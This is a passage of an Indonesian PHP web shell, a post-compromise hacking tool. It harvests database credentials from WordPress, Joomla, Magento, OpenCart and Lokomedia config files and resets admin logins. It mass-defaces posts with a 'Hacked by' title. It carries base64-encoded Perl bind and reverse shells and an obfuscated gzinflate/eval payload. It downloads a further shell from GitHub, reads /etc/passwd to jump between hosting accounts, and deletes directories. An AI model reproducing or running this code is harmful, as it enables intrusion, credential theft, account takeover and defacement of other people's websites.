                    echo "sukses upload <b>$files</b> di folder ini";
                } else {
                    echo "gagal upload";
                }
            }
        }
        die();
    }
    if ($_GET['do'] == 'auto_wp') {
        if ($_POST['hajar']) {
            $title = htmlspecialchars($_POST['new_title']);
            $pn_title = str_replace(" ", "-", $title);
            if ($_POST['cek_edit'] == "Y") {
                $script = $_POST['edit_content'];
            } else {
                $script = $title;
            }
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach ($scan_conf as $file_conf) {
                if (!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if (preg_match("/WordPress/", $config)) {
                    $dbhost = ambilkata($config, "DB_HOST', '", "'");
                    $dbuser = ambilkata($config, "DB_USER', '", "'");
                    $dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
                    $dbname = ambilkata($config, "DB_NAME', '", "'");
                    $dbprefix = ambilkata($config, "table_prefix  = '", "'");
                    $prefix = $dbprefix . "posts";
                    $option = $dbprefix . "options";
                    $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                    $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                    echo "<div style='margin: 5px auto;'>";
                    if ($target == '') {
                        echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                    } else {
                        echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                    }
                    if (!$update or !$conn or !$db) {
                        echo "<font color=red>MySQL Error: " . mysql_error() . "</font><br>";
                    } else {
                        echo "<font color=blue>sukses di ganti.</font><br>";
                    }
                    echo "</div>";
                    mysql_close($conn);
                }
            }
        } else {
            echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by Tampansky' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
        }
        die();
    }
    if ($_GET['do'] == 'network') {
        echo "<form method='post'>
        <u>Bind Port:</u> <br>
        PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
        <input type='submit' name='sub_bp' value='>>'>
        </form>
        <form method='post'>
        <u>Back Connect:</u> <br>
        Server: <input type='text' placeholder='ip' name='ip_bc' value='" . $_SERVER['REMOTE_ADDR'] . "'>��
        PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
        <input type='submit' name='sub_bc' value='>>'>
        </form>";
        $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
        if (isset($_POST['sub_bp'])) {
            $f_bp = fopen("/tmp/bp.pl", "w");
            fwrite($f_bp, base64_decode($bind_port_p));
            fclose($f_bp);

            $port = $_POST['port_bind'];
            $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre>" . $out . "\n" . exe("ps aux | grep bp.pl") . "</pre>";
            unlink("/tmp/bp.pl");
        }
        $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
        if (isset($_POST['sub_bc'])) {
            $f_bc = fopen("/tmp/bc.pl", "w");
            fwrite($f_bc, base64_decode($bind_connect_p));
            fclose($f_bc);

            $ipbc = $_POST['ip_bc'];
            $port = $_POST['port_bc'];
            $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre>" . $out . "\n" . exe("ps aux | grep bc.pl") . "</pre>";
            unlink("/tmp/bc.pl");
        }
        die();
    }
    if ($_GET['do'] == 'adminers') {
        $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        function adminer($url, $isi)
        {
            $fp = fopen($isi, "w");
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            return curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            ob_flush();
            flush();
        }
        if (file_exists('adminer.php')) {
            echo "<center><font color=blue><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            if (adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php")) {
                echo "<center><font color=blue><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
            } else {
                echo "<center><font color=red>gagal buat file adminer</font></center>";
            }
        }
    }
    if (isset($_GET['do']) && ($_GET['do'] == 'adminer')) {
        echo '<center><br><br><h3>File Creator [Auto upload]</h3>
        <table>
        <tr><form method="post" action="">&nbsp;<td>
        <select class="bordergaya" align="left"  name="pilihan" id="pilih">
        <option value="hsphere">Bypass hSphere Shell</option>
        <option value="adminer">Adminer</option>
        </select>
        <input  type="submit" name="submites" class="bordergaya" value="create">
        </td></form></tr></table><br/><br/><br/>';
        error_reporting(0);
        set_time_limit(0);
        $submit = $_POST['submites'];
        if (isset($submit)) {
            $pilih = $_POST['pilihan'];
            ///hsphere shell
            if ($pilih == 'hsphere') {
                $files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sc0hsphere.php");
                file_put_contents("hsphere.php", $files);
                echo "<script>alert('Bypass hsphere shell created!'); hideAll();</script>";
                echo "<a href=" . "hsphere.php" . " target=_blank><b>hsphere.php [Click here]</b></a></center>";
                die();
            } elseif ($pilih == 'adminer') {
                getfile("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php");
                echo "<script>alert('adminer created!'); hideAll();</script>";
                echo "<a href=" . "adminer.php" . " target=_blank><b>adminer.php [Click here]</b></a></center>";
                die();
            }
        }
        die();
    }

    if ($_GET['do'] == 'auto_edit_user') {
        if ($_POST['hajar']) {
            if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
                echo "username atau password harus lebih dari 6 karakter";
            } else {
                $user_baru = $_POST['user_baru'];
                $pass_baru = md5($_POST['pass_baru']);
                $conf = $_POST['config_dir'];
                $scan_conf = scandir($conf);
                foreach ($scan_conf as $file_conf) {
                    if (!is_file("$conf/$file_conf")) continue;
                    $config = file_get_contents("$conf/$file_conf");
                    if (preg_match("/JConfig|joomla/", $config)) {
                        $dbhost = ambilkata($config, "host = '", "'");
                        $dbuser = ambilkata($config, "user = '", "'");
                        $dbpass = ambilkata($config, "password = '", "'");
                        $dbname = ambilkata($config, "db = '", "'");
                        $dbprefix = ambilkata($config, "dbprefix = '", "'");
                        $prefix = $dbprefix . "users";
                        $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result['id'];
                        $site = ambilkata($config, "sitename = '", "'");
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                        echo "Config => " . $file_conf . "<br>";
                        echo "CMS => Joomla<br>";
                        if ($site == '') {
                            echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                        } else {
                            echo "Sitename => $site<br>";
                        }
                        if (!$update or !$conn or !$db) {
                            echo "Status => <font color=red>" . mysql_error() . "</font><br><br>";
                        } else {
                            echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif (preg_match("/WordPress/", $config)) {
                        $dbhost = ambilkata($config, "DB_HOST', '", "'");
                        $dbuser = ambilkata($config, "DB_USER', '", "'");
                        $dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
                        $dbname = ambilkata($config, "DB_NAME', '", "'");
                        $dbprefix = ambilkata($config, "table_prefix  = '", "'");
                        $prefix = $dbprefix . "users";
                        $option = $dbprefix . "options";
                        $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[ID];
                        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                        $result2 = mysql_fetch_array($q2);
                        $target = $result2[option_value];
                        if ($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                        echo "Config => " . $file_conf . "<br>";
                        echo "CMS => Wordpress<br>";
                        echo $url_target;
                        if (!$update or !$conn or !$db) {
                            echo "Status => <font color=red>" . mysql_error() . "</font><br><br>";
                        } else {
                            echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif (preg_match("/Magento|Mage_Core/", $config)) {
                        $dbhost = ambilkata($config, "<host><![CDATA[", "]]></host>");
                        $dbuser = ambilkata($config, "<username><![CDATA[", "]]></username>");
                        $dbpass = ambilkata($config, "<password><![CDATA[", "]]></password>");
                        $dbname = ambilkata($config, "<dbname><![CDATA[", "]]></dbname>");
                        $dbprefix = ambilkata($config, "<table_prefix><![CDATA[", "]]></table_prefix>");
                        $prefix = $dbprefix . "admin_user";
                        $option = $dbprefix . "core_config_data";
                        $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[user_id];
                        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                        $result2 = mysql_fetch_array($q2);
                        $target = $result2[value];
                        if ($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                        echo "Config => " . $file_conf . "<br>";
                        echo "CMS => Magento<br>";
                        echo $url_target;
                        if (!$update or !$conn or !$db) {
                            echo "Status => <font color=red>" . mysql_error() . "</font><br><br>";
                        } else {
                            echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
                        $dbhost = ambilkata($config, "'DB_HOSTNAME', '", "'");
                        $dbuser = ambilkata($config, "'DB_USERNAME', '", "'");
                        $dbpass = ambilkata($config, "'DB_PASSWORD', '", "'");
                        $dbname = ambilkata($config, "'DB_DATABASE', '", "'");
                        $dbprefix = ambilkata($config, "'DB_PREFIX', '", "'");
                        $prefix = $dbprefix . "user";
                        $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[user_id];
                        $target = ambilkata($config, "HTTP_SERVER', '", "'");
                        if ($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                        echo "Config => " . $file_conf . "<br>";
                        echo "CMS => OpenCart<br>";
                        echo $url_target;
                        if (!$update or !$conn or !$db) {
                            echo "Status => <font color=red>" . mysql_error() . "</font><br><br>";
                        } else {
                            echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif (preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
                        $dbhost = ambilkata($config, 'server = "', '"');
                        $dbuser = ambilkata($config, 'username = "', '"');
                        $dbpass = ambilkata($config, 'password = "', '"');
                        $dbname = ambilkata($config, 'database = "', '"');
                        $prefix = "users";
                        $option = "identitas";
                        $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                        $result = mysql_fetch_array($q);
                        $target = $result[alamat_website];
                        if ($target == '') {
                            $target2 = $result[url];
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                            if ($target2 == '') {
                                $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                            } else {
                                $cek_login3 = file_get_contents("$target2/adminweb/");
                                $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                                if (preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                    $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                                } elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                    $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                                } else {
                                    $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                }
                            }
                        } else {
                            $cek_login = file_get_contents("$target/adminweb/");
                            $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                            if (preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                                $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                            } elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                                $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                        echo "Config => " . $file_conf . "<br>";
                        echo "CMS => Lokomedia<br>";
                        if (preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                            echo $url_target2;
                        } else {
                            echo $url_target;
                        }
                        if (!$update or !$conn or !$db) {
                            echo "Status => <font color=red>" . mysql_error() . "</font><br><br>";
                        } else {
                            echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    }
                }
            }
        } else {
            echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='panthom' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='sky' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='>' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
        }
        die();
    }
    if ($_GET['sky'] == "uploads") {
        echo '';
        echo '<form enctype="multipart/form-data" method="POST"><font color="green">
      <input type="file" name="file" />
      <input type="submit" value=">" />
      ';
        $file = $_FILES['file']['name'];
        if (isset($_FILES['file'])) {
            if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
                echo "<br>[+] Succes <b>$file</b> [+] </font><br />";
            } else {
                echo '<br>[-] error [-]</font><br /></form>
                    </td></tr>';
            }
        }
        die();
    }

    if ($_GET['sky'] == 'sym') {
        echo '<hr>';
        eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSRBrReKUrjCt0lakAtskqCLHPmOPi8+6u2BSyv++d+fYpE4AlVbaJhWJyHnf/b583ksnnjMGPkglJoLmLAip3ZkcH77/4/D9mXVw9Ob098N3J5P3R0cn1ocuENKFTh6oxBm2W52oNwvSTKL6fpwyahOPqtDLghmN3JBnMdFSW1uJUmhWtltpbFc6zk27tT+7jFJhk4iGwWIiFzPS7b148UIr7YdJg2Wo9JqGNmEZPJfggeBcGXpHe9/BMKyjXKUcI3qbRSgr4RfOGC+OF7Pf0uwSIzhIBQ0VFwsjAMa8m6hZu/U6ik4WOQVFr5WHeUgzcPMkB8P5NcgiRkWT2W4dByqV8QJeZwvLBJLrMGKe08y20HAQ4otLq2sVVhloYfiFSBXmGaW7ZezOcD8OGZclUYvSMOFA2q2RCqaMQsDSi8wPaaYwjCkXERX+DlZtwahvFWmkkr2fej8MS87zkDMu9rZe/tzDv6E11maE+Yw+szQexTxTYMR9ls4oyPQj9QfjYxfecXfkafZ45KnoS5QPuCnxE7VPJRVP1cVCMyx0Q9vDdyemX0M+Rz0f+vgt5oIGYVJ3JAQSls+6ObFXqaAXqU0+8oySbsVybnIkT2aBCpNJwJhtbWkBILb7o0O2rG5lRD+UidDljNlcJrZ+QsM4bAwbRIl0ZldCZ/0PZ70PjgNjGGj/nTnmAUPNuUyvJxdU5cU8jWwzaLzIqFhO2xUmJpBUesRtmqq7CIvfyB8mpszhMnEEXKjS46LCPelnNEZqAImgsY9jne95XlEUbtO3S7yqRiyQ0lfXarwuU3sJVjxpOf3qZ5bGEcuI1bzKtdXRsOXV6OBpKPASPqPemrqXz6csDSc45cwCFQjMpW9NpizILq21KJsdtAxt2UOwWshlvra3h7e3t3WqPTOvpt9uKZNUl/Lk8PjELyHSMkXL0V0RWWU7gG0EnoSI/3VAhMcQER6AROQ2UREqWIQHcLE/LtEO7sEN0/M7GzHuEZUN2PSYk3VEqvEIPgckMO9dJ4usdApuXSKIA1wAvU6VTU4z8/aKg5YFrfjMVB6KRLfZs5hyXLaa7ujGgo7e0jG2vlxSjUODYlSzAiGChV1SdUB3IIcte+4huL1yzvfOPU9qhJPdWrdpaPWQIOVEdvFqqCRw9o3GHQrWhhD5+gP49AnWGL4PPc24c+MDmaYZWSPqlP3V73uxXOddBcJj6dTL7mMGIi80aTP3gucJFes8uTEQYy+arTPmEk0hNN0TQ6zyzW+VbWJoDcTfzQxzhxEHk423mEqzOb0bID0gDzXuho3wYLevwLzWq0KpFMmq50cMVBj/AMQ3XKwi/BrA1wMY3DN9Gr9rlKkmownmJZTr+5VLeIYJ/jPNIl5I4tzci9mbEFtfsGt4fYfW6PkLAbvXe/kNoLrd+mqwfgCpq0Ing2WZrcsBYzs70aAuDxxTcUXFyEsG428C7m8P/lVgV3SWY6IIGXbwQOvjY888DTTW65schfAAtZfskQ+GW37d3nbgpoPXnv5h1bj/jMASQfFwQJJTOnN9+JunWLY9q2vILjnPsHGrSlijqfDG1rAKrTw+9ZdlA+4i0URllo+iUrk4jgjeRblY4nxeLY/d7lJRk1dGZxdNray0ap9tsvpV+2x9mX2bTfZ9jX1fY//nNdYYxw2bbORF6RV+LoMmw3mmza5MplG6Bb3v4E59EwK+CbKM4yvjz2hFoYmHtQdtrvx/Nf4H')));
    }
    if ($_GET['sky'] == 'jumping') {
        $i = 0;
        echo "<div class='margin: 5px auto;'>";
        if (preg_match("/hsphere/", $dir)) {
            $urls = explode("\r\n", $_POST['url']);
            if (isset($_POST['jump'])) {
                echo "<pre>";
                foreach ($urls as $url) {
                    $url = str_replace(array("http://", "www."), "", strtolower($url));
                    $etc = "/etc/passwd";
                    $f = fopen($etc, "r");
                    while ($gets = fgets($f)) {
                        $pecah = explode(":", $gets);
                        $user = $pecah[0];
                        $dir_user = "/home/$user";
                        if (is_dir($dir_user) === true) {
                            $url_user = $dir_user . "/" . $url;
                            if (is_readable($url_user)) {
                                $i++;
                                $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold> $url_user </font></a>";
                                if (is_writable($url_user)) {
                                    $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold> $url_user </font></a>";
                                }
                                echo $jrw . "<br>";
                            }
                        }
                    }
                }
                if ($i == 0) {
                } else {
                    echo "<br>Total ada " . $i . " Kamar di " . $ip;
                }
                echo "</pre>";
            } else {
                echo '<center>
                                <form method="post">
                                List Domains: <br>
                                <textarea name="url" style="width: 500px; height: 250px;">';
                $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt", "r");
                while ($getss = fgets($fp)) {
                    echo $getss;
                }
                echo  '</textarea><br>
                                <input type="submit" value=">" name="jump" style="width: 500px; height: 25px;">
                                </form></center>';
            }
        } elseif (preg_match("/vhosts|vhost/", $dir)) {
            preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
            $urls = explode("\r\n", $_POST['url']);
            if (isset($_POST['jump'])) {
                echo "<pre>";
                foreach ($urls as $url) {
                    $url = str_replace("www.", "", $url);
                    $web_vh = "/var/www/" . $vh[1] . "/$url/httpdocs";
                    if (is_dir($web_vh) === true) {
                        if (is_readable($web_vh)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            if (is_writable($web_vh)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            }
                            echo $jrw . "<br>";
                        }
                    }
                }
                if ($i == 0) {
                } else {
                    echo "<br>Total ada " . $i . " Kamar di " . $ip;
                }
                echo "</pre>";
            } else {
                echo '<center>
                                <form method="post">
                                List Domains: <br>
                                <textarea name="url" style="width: 500px; height: 250px;">';
                bing("ip:$ip");
                echo  '</textarea><br>
                                <input type="submit" value=">" name="jump" style="width: 500px; height: 25px;">
                                </form></center>';
            }
        } else {
            echo "<pre>";
            $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
            while ($passwd = fgets($etc)) {
                if ($passwd == '' || !$etc) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                    foreach ($user_jumping[1] as $user_idx_jump) {
                        $user_jumping_dir = "/home/$user_idx_jump/public_html";
                        if (is_readable($user_jumping_dir)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            if (is_writable($user_jumping_dir)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            }
                            echo $jrw;
                            if (function_exists('posix_getpwuid')) {
                                $domain_jump = file_get_contents("/etc/named.conf");
                                if ($domain_jump == '') {
                                    echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                    foreach ($domains_jump[1] as $dj) {
                                        $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_jumping_url = $user_jumping_url['name'];
                                        if ($user_jumping_url == $user_idx_jump) {
                                            echo " => ( <u>$dj</u> )<br>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                echo "<br>";
                            }
                        }
                    }
                }
            }
            if ($i == 0) {
            } else {
                echo "<br>Total ada " . $i . " Kamar di " . $ip;
            }
            echo "</pre>";
        }
        echo "</div>";
    }
    if ($_GET['act'] == 'newfile') {
        if ($_POST['new_save_file']) {
            $newfile = htmlspecialchars($_POST['newfile']);
            $fopen = fopen($newfile, "a+");
            if ($fopen) {
                $act = "<script>window.location='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_file' value='Submit'>
        </form>";
    } elseif ($_GET['act'] == 'newfolder') {
        if ($_POST['new_save_folder']) {
            $new_folder = $dir . '/' . htmlspecialchars($_POST['newfolder']);
            if (!mkdir($new_folder)) {
                $act = "<font color=red>permission denied</font>";
            } else {
                $act = "<script>window.location='?dir=" . $dir . "';</script>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_folder' value='Submit'>
        </form>";
    } elseif ($_GET['act'] == 'rename_dir') {
        if ($_POST['dir_rename']) {
            $dir_rename = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_POST['fol_rename']) . "");
            if ($dir_rename) {
                $act = "<script>window.location='?dir=" . dirname($dir) . "';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
            echo "" . $act . "<br>";
        }
        echo "<form method='post'>
        <input type='text' value='" . basename($dir) . "' name='fol_rename' style='width: 450px;' height='10'>
        <input type='submit' name='dir_rename' value='rename'>
        </form>";
    } elseif ($_GET['act'] == 'delete_dir') {
        if (is_dir($dir)) {
            if (is_writable($dir)) {
                @rmdir($dir);
                @exe("rm -rf $dir");
                @exe("rmdir /s /q $dir");
                $act = "<script>window.location='?dir=" . dirname($dir) . "';</script>";
            } else {
                $act = "<font color=red>could not remove " . basename($dir) . "</font>";
            }
        }
        echo $act;
    } elseif ($_GET['act'] == 'view') {
        echo "Filename: <font color=blue>" . basename($_GET['file']) . "</font> [ <a href='?act=view&dir=$dir&file=" . $_GET['file'] . "'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=$dir&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=$dir&file=" . $_GET['file'] . "'>delete</a> ]<br>";
        echo "<textarea readonly>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea>";
    } elseif ($_GET['act'] == 'edit') {
        if ($_POST['save']) {
            $save = file_put_contents($_GET['file'], $_POST['src']);
            if ($save) {
                $act = "<font color=blue>Saved!</font>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
            echo "" . $act . "<br>";
        }
